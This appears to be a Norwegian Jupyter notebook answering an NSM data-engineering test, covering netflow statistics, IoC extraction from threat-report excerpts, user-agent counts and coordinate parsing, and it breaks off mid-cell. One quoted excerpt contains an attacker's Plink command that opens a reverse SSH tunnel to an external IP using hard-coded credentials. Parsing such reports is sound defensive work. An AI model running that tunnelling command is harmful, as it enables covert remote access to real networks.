{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "ce125948-1e1c-462a-a4a4-9fd25c4e4467",
   "metadata": {},
   "source": [
    "# NSMs Evnetest for Dataingeniører\n",
    "-------\n",
    "Oppgavene og datasettene er hentet fra **[https://memes.agency/o21/](https://memes.agency/o21/)** </br>\n",
    "Besvarelse av **[Sebastian Einar Salas Røkholt](https://www.linkedin.com/in/sebastianrokholt/)**</br>\n",
    "Juli 2024</br>\n",
    "\n",
    "----------"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ddb55db1-13c1-4d77-8b07-0bac60705714",
   "metadata": {},
   "source": [
    "## Oppgave 1: Netflow"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4af0ce40-2a84-45ba-909b-7b318a3bc8c5",
   "metadata": {},
   "source": [
    "a) I dette netflow-datasettet er det ønskelig å finne svar på følgende:</br>\n",
    "- [Hvor mange unike IP-adresser er det?](#unike-ip-adresser)</br>\n",
    "- [Hva er den totale mengden bytes per IP per retning?](#antall-bytes-per-retning).</br>\n",
    "- [Hvordan er prosentfordelingen av protokollene?](#protokollfordeling).</br>\n",
    "- [Hvordan er prosenfordelingen av portene?](#portfordeling) Alle porter større enn 1024 kan omtales som `high_ports`.</br>\n",
    "\n",
    "b) [Hadde det vært relevant å utvikle en annen datamodell?](#forslag-til-endringer-i-datamodellen)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "39ac1eef-c4af-481c-a595-be67a4d43ad6",
   "metadata": {},
   "outputs": [],
   "source": [
    "import pandas as pd\n",
    "import numpy as np\n",
    "import matplotlib.pyplot as plt\n",
    "import re\n",
    "from collections import Counter\n",
    "import networkx"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a5cfe40b-22dd-46de-a24b-c414755b118e",
   "metadata": {},
   "source": [
    "### Kjapp oversikt over dataene"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 134,
   "id": "58aece8d-9b19-4d36-b3f7-53a0aaa0da5d",
   "metadata": {},
   "outputs": [],
   "source": [
    "df = pd.read_csv(\"data/O1-Flow.csv\", delimiter=\";\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9ab225f8-af86-4b37-8580-32567219d1eb",
   "metadata": {},
   "outputs": [],
   "source": [
    "df.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9a7a7108-b42d-4115-90e0-d84da5d960c2",
   "metadata": {},
   "outputs": [],
   "source": [
    "df.info()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "57e24d09",
   "metadata": {},
   "source": [
    "Hvor mange unike datoer er dataene samlet inn fra?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "623b4782-8687-4a39-b955-72500b2b3828",
   "metadata": {},
   "outputs": [],
   "source": [
    "len(df[\"STARTTIME\"].str.split(\"T\").str[0].unique())"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b0165204",
   "metadata": {},
   "source": [
    "Ikke lett å se om det er %Y-%m%-%d eller %Y-%d-%m som er riktig format her, men jeg tar en sjans på %Y-%m%-%d da dette er det vanligste formatet å lagre tidspunkter i. </br>\n",
    "Datoene er uansett den samme: 2019-09-03."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bc736f41-be64-4457-8790-c118d310331d",
   "metadata": {},
   "outputs": [],
   "source": [
    "df[\"STARTTIME\"] = pd.to_datetime(df[\"STARTTIME\"], format=\"%Y-%m-%dT%H:%M:%S\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b3ffdae6-6912-459a-9b25-9f4aae59c0db",
   "metadata": {},
   "outputs": [],
   "source": [
    "display(df.describe())\n",
    "df.isna().sum()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f684a825-585c-4870-9fcb-e8524d2c5713",
   "metadata": {},
   "source": [
    "Vi kan se at dataene er samlet inn i løpet av ett 60 minutters intervall, og at det er 1000 datapunkter i datasettet.</br> Ingen av disse inneholder NaN-verdier. Jeg vil nå analysere datasettet for å gi svar på de fire spørsmålene i oppgaveteksten."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "046c8e56-c390-4b9a-855f-c3df8d592147",
   "metadata": {},
   "source": [
    "### Unike IP-adresser"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b6791d16-6a15-432f-aa16-1eeddb14dbce",
   "metadata": {},
   "outputs": [],
   "source": [
    "source_ip = df['SOURCE'].str.split(':').str[0]\n",
    "dest_ip = df['DEST'].str.split(':').str[0]\n",
    "n_unique_ips = len(pd.concat([source_ip, dest_ip]).unique())\n",
    "print(f\"Det er {n_unique_ips} unike IP-adresser i datasettet\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "80d5d6af-edcc-4ee6-8601-997c9405c78a",
   "metadata": {},
   "source": [
    "### Antall bytes per retning"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cbdda2f0-587d-4cea-9fde-3d261eaab46c",
   "metadata": {},
   "outputs": [],
   "source": [
    "bytes_per_source_ip = df.groupby(source_ip)['BYTES'].sum()\n",
    "bytes_per_dest_ip = df.groupby(dest_ip)['BYTES'].sum()\n",
    "\n",
    "print(\"Totalt antall bytes per avsender:\")\n",
    "display(bytes_per_source_ip.head())\n",
    "print(\"\\n\\nTotalt antall bytes per mottaker:\")\n",
    "display(bytes_per_dest_ip.head())"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "bfd8dbc0-9a1f-454e-9f54-decb31edb218",
   "metadata": {},
   "source": [
    "### Protokollfordeling"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d0086336-4c35-4d2d-b2ff-28b106f0dc87",
   "metadata": {},
   "outputs": [],
   "source": [
    "distr = df['PROTO'].value_counts(normalize=True) * 100\n",
    "ax = distr.plot.pie(y=\"proportion\", autopct='%1.1f%%', figsize=(7, 7), explode=[0.0, 0.6, 0.6])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2367b613-2a18-4a81-ba6f-2679c41abefe",
   "metadata": {},
   "source": [
    "### Portfordeling"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0aadfa05-f186-4b9a-ad23-fcbcc178dde0",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Separerer porter fra IP-adressene\n",
    "source_ports = df['SOURCE'].str.split(':').str[1].fillna(0).astype(int)\n",
    "dest_ports = df['DEST'].str.split(':').str[1].fillna(0).astype(int)\n",
    "\n",
    "# Gir porter som er høyere enn 1024 navnet \"high_ports\"\n",
    "source_ports_cat = source_ports.apply(lambda x: 'high_ports' if int(x) > 1024 else x)\n",
    "dest_ports_cat = dest_ports.apply(lambda x: 'high_ports' if int(x) > 1024 else x)\n",
    "\n",
    "# Regner ut prosentfordelingen\n",
    "source_ports_dist = source_ports_cat.value_counts(normalize=True) * 100\n",
    "dest_ports_dist = dest_ports_cat.value_counts(normalize=True) * 100\n",
    "\n",
    "# Kombinerer kilde- og destinasjonsporter til én DataFrame\n",
    "port_dist = pd.concat([source_ports_dist, dest_ports_dist], axis=1).fillna(0)\n",
    "port_dist.columns = ['Source Ports (in %)', 'Destination Ports (in %)']\n",
    "port_dist"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "07c5303a",
   "metadata": {},
   "source": [
    "Det er var én rad som ikke hadde portverdi etter IP-adressen, så jeg har gitt den porten verdi \"0\" i tabellen over. Her er en enkel visualisering av fordelingen: "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4efc7bc5",
   "metadata": {},
   "outputs": [],
   "source": [
    "other_ports = [853, 1024, 0]\n",
    "other_ports_summed = port_dist.loc[other_ports].sum()\n",
    "port_dist.loc['853, 1024 or N/A'] = other_ports_summed\n",
    "port_dist.drop(other_ports, inplace=True)\n",
    "\n",
    "# Plot the proportions of source ports\n",
    "port_dist['Source Ports (in %)'].plot.pie(y=\"proportion\", autopct='%1.1f%%', figsize=(7, 7), explode=[0.1, 0.1, 0.1])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "65ecfdb1-d19d-4760-aa6b-bbae38a3c38a",
   "metadata": {},
   "source": [
    "### Forslag til endringer"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1c632f95-c07a-410a-8ee3-0e625aa42e14",
   "metadata": {},
   "source": [
    "1) **Mer kontekst**: </br>\n",
    "For analyse av NetFlow-data kan det være en stor fordel å ha mer informasjon om hvor trafikken kommer ifra, og dersom man overvåker flere forskjellige netterk, hvilket nettverk den befinner seg på. Dette vil være et viktig steg mot å f.eks. bygge et maskinlæringsbasert anomaly detection-system. Jeg anbefaler å legge til følgende attributter i databasen: \n",
    "    - **TOS (Type of Service)**: Så vi lettere kan finne ut av hva slags aktivitet dataene tilhører (videostreaming, VoIP (voice over IP), etc.)\n",
    "    - **VLAN ID (Virtual Local Area Network Identifier)**: Dersom dette er konfigurert, kan VLAN ID brukes til å lettere identifisere hvem eller hva som sender og mottar trafikk. For eksempel vil man kunne se om det er en bruker som sender data til en server, eller om det er data som sendes mellom ulike deler av nettverket. Under et angrep vil man også kunne bruke VLAN ID til å isolere deler av nettverket.\n",
    "    - **Geolokalisering**: IP-adressens koordinater, land eller by\n",
    "    - **DNS**: I tillegg til å se hvilken IP-adresse det er som mottar dataene, kan det være en fordel å også se hvilke domener og URL-er disse IP-adressene er knyttet til. \n",
    "    - **Threat Intelligence-flagging**: Man kan også anvende trusseldelingsforum og verktøy som f.eks IBM X-Force Exchange til å flagge trafikken i NetFlow-databasen. Disse foraene deler informasjon om ondsinnede IP-adresser, domener og angrepsmønstre i real-time slik at man raskere kan detektere og avverge angrep.\n",
    "    - **Utregnede attributter**: \n",
    "        - Gjennomsnittlig pakkestørrelse\n",
    "        - Trafikkrate: bytes per sekund\n",
    "        - Sluttidspunkt: Siden vi har varighet og starttidspunkt kan man også regne ut sluttidspunktet ved analysetidspunktet. Dette kan man bruke videre til å identifisere om forskjellige aktiviteter og/eller hendelser overlapper i tidsrom. \n",
    "        - Utvidet aggregering: Man kan aggregere data over tid i en egen tabell. For eksempel kan man holde oversikt over totalt antall forbindelser per IP, når IP-addressen pleier å være aktiv, og løpende gjennomsnitt av pakkestørrelse og trafikkrate.\n",
    "        \n",
    "    \n",
    "    Dersom dataene går gjennom en konfigurerbar nettverksenhet (f. eks en ruter), ville jeg også lagt til:\n",
    "    - **Inn- og utgangsgrensesnitt** (ingress/input and egress/output network interfaces), altså de fysiske eller virtuelle portene på nettverksenheten</br></br>\n",
    "\n",
    "\n",
    "2) **Normalisere databaseschemaet:** </br>\n",
    " Det står ikke noe i oppgaven om hvorvidt disse dataene kommer fra en produksjonsdatabase eller om de er en sammenstilling for analyse. Dersom det skulle være det førstnevnte, foreslår jeg at dere normaliserer database-schemaet deres til 3NF (normal form) ved å splitte dataene i `SOURCE` og `DEST` gjennom å lagre `IP` og `PORT` separat, og derette skille ut begge disse pluss `PROTO` til egne tables som er relatert til `flows`-tabellen. Det samme gjelder `VLAN_ID`-, `TOS`- og `INTERFACE`-attributtene dersom de kan kobles til flere detaljer/metadata. På denne måten sparer man lagringsplass ved å unngå å gjenta redundante verdier. \n",
    "\n",
    "3) **Valg av database (bonus)**: </br>\n",
    "Automatiserte analyseteknikker (e.g. anomaly detection) som skal fungere i real time er helt avhengige av å kunne gjennomføre hyppige og hurtige spørringer mot databasen. Dersom man overvåker flere nettverk samtidig vil NetFlow-databasen vokse raskt, så man trenger også et databaseprogram som kan skaleres opp til å håndtere store datamengder. Basert på disse kravene vil jeg anbefale noe som Timescale (basert på PostgreSQL men optimalisert for real-time analyse av tidsseriedata), Cassandra, eller Apache Kafka. \n",
    "\n",
    "\n",
    "***"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c20c49c8-5f17-4b49-8bdf-dbf7b763fe27",
   "metadata": {},
   "source": [
    "## Oppgave 2: Ustrukturerte data"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1e9b0852",
   "metadata": {},
   "source": [
    "Følgende data mangler struktur for både at operatører skal kunne jobbe med opplysningene her, men også for å kunne gjøre videre automatiske korrelasjonsoperasjoner. Det er behov for å lage en modell som blant annet inneholder egenskapene kilde, navn, multivalue IoC, IoC-type og melding.\n",
    "\n",
    "Det er ønskelig å se løsningen som parser de nedenforstående paragrafer og populerer modellen, for deretter å ha en programatisk løsning for å hente ut like IoCer på tvers av oppføringene med hvilket IDer som er berørt."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4705959c-b63d-4600-ac01-ba6e92d52bf7",
   "metadata": {},
   "outputs": [],
   "source": [
    "import pandas as pd\n",
    "import re\n",
    "\n",
    "texts = [\n",
    "    \"\"\"Unit42:ironnetinjector - When an IronPython script is run, it is loaded into the IronPython interpreter. In the IronPython script, \n",
    "    the embedded .NET injector (SHA256: a56f69726a237455bac4c9ac7a20398ba1f50d2895e5b0a8ac7f1cdb288c32cc) and ComRAT DLL payload \n",
    "    (SHA256: a62e1a866bc248398b6abe48fdb44f482f91d19ccd52d9447cda9bc074617d56) get decoded and decrypted. This is done with the Python \n",
    "    Base64 module and the RijndaelManaged class from the C# cryptography namespace. The decryption key is passed as an argument to the \n",
    "    IronPython script. The Rijndael initialization vector (IV) is stored in the script. Next, the .NET injector gets loaded into the IronPython \n",
    "    process with the help of the Assembly.Load() method of the C# Reflection namespace. That’s possible because IronPython itself is a .NET \n",
    "    assembly and thus its process already contains all the .NET runtime libraries.\"\"\", \n",
    "\n",
    "    \"\"\"Unit42:bumblebee-webshell-xhunt-campaign - The commands listed in Table 2 in the Appendix also show the actor using Plink (File: RTQ.exe) \n",
    "    to create an SSH tunnel to an external IP address (IP: 10.13.232[.]89), as seen in the following command:\n",
    "    \n",
    "    echo y | c:\\windows\\temp\\RTQ.exe 10.119.110[.]194 -C -R 0.0.0.0:8081::3389 -l bor -pw 123321 -P 443\n",
    "\n",
    "    The IP address overlaps with other related infrastructure that we will discuss in a later section of this blog. Most importantly, \n",
    "    the username and password of bor and 123321 used to create the SSH tunnel overlaps directly with prior xHunt activity. These exact \n",
    "    credentials were listed within the cheat sheet found within the Sakabota tool, which provided an example command that the actor could \n",
    "    use to create SSH tunnels using Plink. We believe the actor used the example command from the cheat sheet as a basis for the commands \n",
    "    they used to create the SSH tunnels via BumbleBee.\"\"\", \n",
    "\n",
    "    \"\"\"Fireeye:UNC1945 - PUPYRAT (aka Pupy) is an open source, multi-platform (Windows, Linux, OSX, Android), multi-function RAT \n",
    "    (Remote Administration Tool) and post-exploitation tool mainly written in Python. It features an all-in-memory execution \n",
    "    guideline and leaves very low footprint. It can communicate using various transports, migrate into processes (reflective injection), \n",
    "    and load remote Python code, Python packages and Python C-extensions from memory.(MD5: d5b9a1845152d8ad2b91af044ff16d0b (SLAPSTICK)) \n",
    "    (MD5; 0845835e18a3ed4057498250d30a11b1 (STEELCORGI)) (MD5: 6983f7001de10f4d19fc2d794c3eb534) (IP: 46.30.189.0/24) (IP: 66.172.12.0/24)\"\"\"\n",
    "]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d393b256",
   "metadata": {},
   "outputs": [],
   "source": [
    "def parse_text(text):\n",
    "    match = re.match(r\"^(.*?):(.*?) - (.*)$\", text, re.DOTALL)\n",
    "    if not match:\n",
    "        return None, None, None, None, text\n",
    "    source = match.group(1).strip()\n",
    "    name = match.group(2).strip()\n",
    "    message = match.group(3).strip()\n",
    "    iocs, ioc_types = extract_iocs(message)\n",
    "\n",
    "    return source, name, iocs, ioc_types, message\n",
    "\n",
    "def extract_iocs(text):\n",
    "    ioc_types, iocs = [], []\n",
    "    patterns = [(\"SHA256\", r\"[A-Fa-f0-9]{64}\"),  # e.g. a62e1a866bc248398b6abe48fdb44f482f91d19ccd52d9447cda9bc074617d56\n",
    "                (\"MD5\", r\"\\b[a-f0-9]{32}\\b\"),  # e.g. 6983f7001de10f4d19fc2d794c3eb534\n",
    "                (\"IP\", r\"(?:\\d{1,3}\\.){2}\\d{1,3}(:?\\[)?\\.(:?\\])?\\d{0,3}\"),  # e.g. 10.13.232[.]89 and 66.172.12.0\n",
    "                (\"File\", r\"[A-Za-z0-9]+\\.exe\")]  # RTQ.exe\n",
    "    for ioc_type, pattern in patterns:\n",
    "        for ioc in re.finditer(pattern, text):\n",
    "            ioc_types.append(ioc_type)\n",
    "            iocs.append(ioc.group())\n",
    "    return iocs, ioc_types\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "85bd72fe",
   "metadata": {},
   "outputs": [],
   "source": [
    "data = []\n",
    "\n",
    "for text in texts:\n",
    "    source, name, iocs, ioc_types, message = parse_text(text)\n",
    "    if iocs:\n",
    "        for ioc, ioc_type in zip(iocs, ioc_types):\n",
    "            data.append((source, name, ioc, ioc_type, message))\n",
    "\n",
    "df = pd.DataFrame(data, columns=[\"source\", \"name\", \"multivalue_IoC\", \"IoC_type\", \"message\"])\n",
    "with pd.option_context('display.max_rows', None, 'display.max_columns', None):\n",
    "    display(df)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ec80535e-ab5e-46da-8000-baf4de242978",
   "metadata": {},
   "outputs": [],
   "source": [
    "def get_sources_by_IoC(df: pd.DataFrame, ioc: str=None, ioc_type: str=None):\n",
    "    if ioc:\n",
    "        sources = df[df[\"multivalue_IoC\"] == ioc]\n",
    "    elif ioc_type: \n",
    "        sources = df[df[\"IoC_type\"] == ioc_type]\n",
    "    return sources[\"source\"].unique()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9a1ef894-5469-441c-bea9-9d9e4763941d",
   "metadata": {},
   "outputs": [],
   "source": [
    "ioc = \"d5b9a1845152d8ad2b91af044ff16d0b\"\n",
    "affected_sources = get_sources_by_IoC(df, ioc=ioc)\n",
    "print(f\"Sources affected by IOC {ioc}: \\n{affected_sources}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d14f9830-0bb6-44b0-adec-2378daabc4f9",
   "metadata": {},
   "outputs": [],
   "source": [
    "ioc_type = \"IP\"\n",
    "affected_sources = get_sources_by_IoC(df, ioc_type=ioc_type)\n",
    "print(f\"Sources affected by {ioc_type}: \\n{affected_sources}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4f59d4ed",
   "metadata": {},
   "source": [
    "---\n",
    "## Oppgave 3: Statistikk\n",
    "I dette datasettet hentet fra webtrafikk med fokus på User-Agents har vi følgende problemstillinger til deg:\n",
    "<ol>\n",
    "    <li type=\"a\"><a href=\"#a-hvor-mange-oppføringer-er-det-totalt\">Hvor mange oppføringer er det totalt?</a></li>\n",
    "    <li type=\"a\"><a href=\"#b-datasettet-inneholder-syntaksfeil-hvilke-linjer\">Datasettet inneholder syntaksfeil, hvilke linjer?</a></li>\n",
    "    <li type=\"a\"><a href=\"#c-hvor-mange-unike-user-agents-eksisterer-i-datasettet\">Hvor mange unike User-Agents eksisterer i datasettet?</a></li>\n",
    "    <li type=\"a\"><a href=\"#d-hvor-mange-unike-user-agents-har-en-forekomst-som-er-større-enn-den-gjennomsnittlige-forekomsten\">Hvor mange unike User-Agents har en forekomst som er større enn den gjennomsnittlige forekomsten?</a></li>\n",
    "</ol>"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6e31c7e9",
   "metadata": {},
   "source": [
    "### Innlastning av dataene"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3916c254",
   "metadata": {},
   "outputs": [],
   "source": [
    "df = pd.read_csv(\"data/O1-UserAgents.csv\")\n",
    "df.head()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "147444ee",
   "metadata": {},
   "source": [
    "### a) Hvor mange oppføringer er det totalt?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d628b85f",
   "metadata": {},
   "outputs": [],
   "source": [
    "print(df.shape)\n",
    "df.info()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6662d2d8",
   "metadata": {},
   "source": [
    "### b) Datasettet inneholder syntaksfeil, hvilke linjer?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f9bd961f",
   "metadata": {},
   "outputs": [],
   "source": [
    "np.where(df.isna())"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "abcf57ac",
   "metadata": {},
   "source": [
    "Rad nummer 4332 har bare tre verdier istedenfor fire. La oss ta en titt på den:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9c8ccc10",
   "metadata": {},
   "outputs": [],
   "source": [
    "df.iloc[4332]"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a6fbf738",
   "metadata": {},
   "source": [
    "Siden det bare er et manglende komma i `_time`-kolonnen, fikser jeg denne feilen ved å redigere raden direkte i .csv-filen."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "02a46c46",
   "metadata": {},
   "outputs": [],
   "source": [
    "df = pd.read_csv(\"data/O1-UserAgents-fixed.csv\")\n",
    "df[\"_time\"] = pd.to_datetime(df[\"_time\"], format=\"%Y-%m-%dT%H:%M:%S.%f%z\")\n",
    "df.info()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "96eaba73",
   "metadata": {},
   "outputs": [],
   "source": [
    "describe_time_col = df.describe()[\"_time\"].dropna()\n",
    "display(describe_time_col)\n",
    "delta = describe_time_col['max'] - describe_time_col['min']\n",
    "print(f\"Dataene er samlet inn i løpet av en {delta.seconds} sekunders periode. \")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "80baad7b",
   "metadata": {},
   "source": [
    "### c) Hvor mange unike User-Agents eksisterer i datasettet?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "69f0126f",
   "metadata": {},
   "outputs": [],
   "source": [
    "df.describe()[\"http.http_user_agent\"].dropna()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "22a7033d",
   "metadata": {},
   "source": [
    "Det er 33 unike User-Agents, hvorav Mozilla/4.0 (Firefox) er den mest vanlige med sine 2171 forekomster. "
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9a937af9",
   "metadata": {},
   "source": [
    "### d) Hvor mange unike User-Agents har en forekomst som er større enn den gjennomsnittlige forekomsten?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "17848842",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Counts the freq of each user agent, then swaps the index (user agent) with column (count) for improved readability\n",
    "ua_counts = df[\"http.http_user_agent\"].value_counts()\n",
    "ua_counts_swapped = ua_counts.reset_index().set_index(\"count\")\n",
    "avg = ua_counts.values.mean()\n",
    "print(f\"Den gjennomsnittlige forekomsten er {round(avg, 1)}.\")\n",
    "gt_avg = ua_counts_swapped[ua_counts.values > avg]\n",
    "print(f\"Disse {len(gt_avg)} User-Agents-ene har en forekomst større enn {round(avg, 1)}: \")\n",
    "gt_avg"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "663a9753",
   "metadata": {},
   "source": [
    "---\n",
    "## Oppgave 4: Nøstede koordinater\n",
    "Hvordan blir din visualisering? "
   ]
  },
  {
   "cell_type": "markdown",
   "id": "21ff30dd",
   "metadata": {},
   "source": [
    "<ol>\n",
    "    <li><a href=\"#dataprosessering\">Dataprosessering</a></li>\n",
    "    <li><a href=\"#innledende-analyse\">Innledende analyse</a></li>\n",
    "    <li><a href=\"#nettverkskonstruksjon\">Nettverkskonstruksjon</a></li>\n",
    "    <li><a href=\"#visualisering\">Visualisering</a></li>\n",
    "    <li><a href=\"#endelig-analyse-og-drøfting\">Endelig analyse og drøfting</a></li>\n",
    "</ol>"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a4bd2f1a",
   "metadata": {},
   "source": [
    "### Dataprosessering"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8356c336",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Laste inn koordinatene som en string\n",
    "coords_str = \"\"\"\n",
    "{{5,65 5,1 26,1 39,3 46,7 49,13 52,18 53,27 53,35 52,45 48,52 44,56 39,60 32,63 26,65 5,65}{16,55 16,10 28,10 34,13 37,16 40,20 41,27 41,36 39,45 36,49 31,53 26,55 16,55}}\n",
    "{{93,65 84,63 80,61 77,59 74,56 71,53 69,48 68,42 68,30 69,21 71,14 74,9 82,3 86,1 93,0 104,1 109,5 113,8 117,14 119,22 119,31 119,41 116,50 113,56 109,61 104,63 99,64 93,65}{93,55 86,51 84,49 81,45 81,38 81,26 82,18 87,13 90,10 95,10 100,12 104,16 106,22 107,27 107,36 106,42 104,47 103,50 100,53 98,54 93,55}}\n",
    "{{132,65 195,65}}\n",
    "{{229,64 218,64 218,41 197,1 210,1 223,30 238,1 250,1 229,41 229,64}}\n",
    "{{288,65 279,63 275,61 272,59 269,56 266,53 264,48 263,42 263,30 264,21 266,14 269,9 277,3 281,1 288,0 299,1 304,5 308,8 312,14 314,22 314,31 314,41 311,50 308,56 304,61 299,63 294,64 288,65}{288,55 281,51 279,49 276,45 276,38 276,26 277,18 282,13 285,10 290,10 295,12 299,16 301,22 302,27 302,36 301,42 299,47 298,50 295,53 293,54 288,55}}\n",
    "{{353,65 345,64 340,63 335,60 333,56 331,50 330,44 330,1 341,1 341,47 344,52 347,54 350,56 356,55 360,54 363,51 365,45 365,1 376,1 376,42 375,51 372,57 369,60 365,63 359,65 353,65}}\n",
    "{{392,65 455,65}}\n",
    "{{465,64 465,1 504,1 504,10 477,10 477,27 503,27 503,36 477,36 477,55 504,55 504,64 465,64}}\n",
    "{{556,64 540,64 521,1 535,1 549,51 563,1 576,1 556,64}}\n",
    "{{595,64 595,1 634,1 634,10 607,10 607,27 633,27 633,36 607,36 607,55 634,55 634,64 595,64}}\n",
    "{{656,65 656,1 671,1 692,46 692,1 702,1 702,65 688,65 666,18 666,65 656,65}}\n",
    "{{717,65 780,65}}\n",
    "{{830,61 821,65 810,65 799,62 792,57 787,51 786,43 786,34 785,27 787,18 790,13 796,6 800,2 808,0 818,1 829,3 829,14 825,12 818,10 813,10 805,13 801,18 798,24 798,35 800,46 803,50 809,54 818,55 824,53 830,51 830,61}}\n",
    "{{879,64 868,64 868,41 847,1 860,1 873,30 888,1 900,1 879,41 879,64}}\n",
    "{{917,65 917,1 940,1 948,2 953,4 955,6 957,10 958,14 958,18 957,22 956,25 954,27 952,30 949,31 954,32 956,34 958,36 960,38 961,42 961,48 960,52 958,56 954,60 948,63 941,65 917,65}{929,28 929,11 938,11 943,13 945,16 945,20 944,24 941,26 939,28 929,28}{929,53 929,36 938,36 943,38 945,41 945,45 944,49 941,51 939,53 929,53}}\n",
    "{{985,64 985,1 1024,1 1024,10 997,10 997,27 1023,27 1023,36 997,36 997,55 1024,55 1024,64 985,64}}\n",
    "{{1046,64 1046,1 1068,1 1076,2 1082,4 1085,7 1087,11 1089,18 1088,23 1087,26 1085,29 1083,31 1079,32 1075,34 1079,37 1081,39 1093,64 1079,64 1071,44 1068,40 1064,38 1058,37 1058,64 1046,64}{1060,34 1060,11 1068,11 1074,12 1076,14 1078,16 1079,19 1079,23 1077,27 1076,30 1074,32 1070,33 1067,34 1060,34}}\n",
    "\"\"\"\n",
    "\n",
    "# Konvertere til nøstede lister av tupler\n",
    "coords_str = coords_str.replace('{', '[').replace('}', ']')\n",
    "nested_lists = re.findall(r'\\[\\[.*?\\]\\]', data)\n",
    "nested_list_of_tuples = []\n",
    "\n",
    "\n",
    "def string_coords_to_tuples(s: str) -> list[tuple[int, int]]:\n",
    "    # Split by space\n",
    "    pairs = s.split()\n",
    "    list_of_tuples = [(int(x), int(y)) for x, y in (pair.split(',') for pair in pairs)]\n",
    "    return list_of_tuples\n",
    "\n",
    "\n",
    "for group in nested_lists:\n",
    "    sublists = re.findall(r'\\[.*?\\]', group[1:-1])\n",
    "    sublist_of_tuples = [string_coords_to_tuples(sublist[1:-1]) for sublist in sublists]\n",
    "    nested_list_of_tuples.append(sublist_of_tuples)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "21f70a81",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Vis den nye nøstede listen\n",
    "for sublist in nested_list_of_tuples:\n",
    "    print(sublist)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "db933596",
   "metadata": {},
   "source": [
    "### Innledende analyse"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8446b4ab",
   "metadata": {},
   "source": [
    "Før jeg bestemmer meg for hvordan jeg skal visualisere dataene, vil jeg bli litt kjent med dem først. Jeg vet ingenting om konteksten dataene er samlet inn fra, og jeg vet strengt tatt ikke om dette er koordinater i det hele tatt. Hvis det skulle være kartkoordinater må det være fra et whiskey-grid eller annet type alternativt koordinatsystem. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f1bd8e28",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Undersøk dataene\n",
    "x_coords = []\n",
    "y_coords = []\n",
    "all_pairs = []\n",
    "\n",
    "for list_i in nested_list_of_tuples:\n",
    "    for list_j in list_i: \n",
    "        for x, y in list_j: \n",
    "            x_coords.append(x)\n",
    "            y_coords.append(y)\n",
    "            all_pairs.append((x, y))\n",
    "\n",
    "print(f\"Det er {len(all_pairs)} koordinatpar i datasettet, hvorav {len(set(all_pairs))} er unike\")\n",
    "print(f\"Det er {len(x_coords)} x-koordinater i datasettet, hvorav {len(set(x_coords))} er unike\")\n",
    "print(f\"Det er {len(y_coords)} y-koordinater i datasettet, hvorav {len(set(y_coords))} er unike\\n\")\n",
    "\n",
    "print(f\"De 10 mest brukte x-koordinatene: (koordinat, frekvens)\\n{Counter(x_coords).most_common(10)}\")\n",
